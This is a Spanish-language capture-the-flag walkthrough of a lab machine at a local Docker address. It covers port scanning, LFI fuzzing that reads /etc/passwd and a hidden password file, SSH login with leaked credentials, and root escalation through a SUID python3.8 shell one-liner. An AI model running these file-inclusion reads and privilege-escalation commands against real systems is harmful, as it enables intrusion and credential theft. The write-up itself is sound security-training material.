
## 1. Reconocimiento

```bash
nmap --privileged -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache httpd 2.4.41 (Ubuntu) |

---

## 2. Enumeración web — disclosure de ruta y parámetro LFI

La IP sirve la página por defecto de Apache. Gobuster con extensiones comunes localiza un único archivo:

```bash
gobuster dir -u "http://172.17.0.2" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,zip,bak,db,log
```

```
index.php  (Status: 200) [Size: 110]
```

```bash
curl http://172.17.0.2/index.php
```

```
Bienvenido al servidor CTF Patriaquerida.
¡No olvides revisar el archivo oculto en /var/www/html/.hidden_pass!
```

La propia aplicación publica la ruta de un archivo con credenciales. Antes de intentar leerlo directamente, se busca el vector de inclusión.

---

## 3. LFI — fuzzing del parámetro `page`

El mensaje sugiere que `index.php` incluye archivos. Se fuzzean parámetros GET filtrando el tamaño de la respuesta sin parámetro (110 bytes):

```bash
ffuf -u "http://172.17.0.2/index.php?FUZZ=test" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -fs 110
```

```
page   [Status: 200, Size: 0]
```

LFI confirmado con `/etc/passwd`:

```bash
curl "http://172.17.0.2/index.php?page=/etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
...
pinguino:x:1000:1000::/home/pinguino:/bin/bash
mario:x:1001:1001::/home/mario:/bin/bash
```

Dos usuarios del sistema: `pinguino` y `mario`. Se lee el archivo revelado por la propia web:

```bash
curl "http://172.17.0.2/index.php?page=.hidden_pass"
```

```
balu
```

El LFI resuelve rutas relativas al document root, por lo que `.hidden_pass` equivale a `/var/www/html/.hidden_pass` — exactamente la ruta que el mensaje de bienvenida anunciaba.

---

## 4. Acceso SSH como pinguino

```bash
ssh pinguino@172.17.0.2
# contraseña: balu
```

```
pinguino@f1d3608c96d1:~$
```

---

## 5. Movimiento lateral a mario — nota en texto claro

```bash
ls -lah
cat nota_mario.txt
```

```
La contraseña de mario es: invitaacachopo
```

```bash
su mario
# contraseña: invitaacachopo
```

---

## 6. Escalada a root — SUID en python3.8

`mario` no tiene entradas en sudoers. Se buscan binarios con SUID:

```bash
find / -perm -4000 2>/dev/null
```

Entre los resultados aparece `/usr/bin/python3.8`. Un intérprete con SUID puede ejecutar código que hereda `euid=0`. Vector de GTFOBins:

```bash
python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
# id
uid=1001(mario) gid=1001(mario) euid=0(root) groups=1001(mario)
# whoami
root
```

El flag `-p` hace que el shell no descarte los privilegios efectivos heredados del SUID.
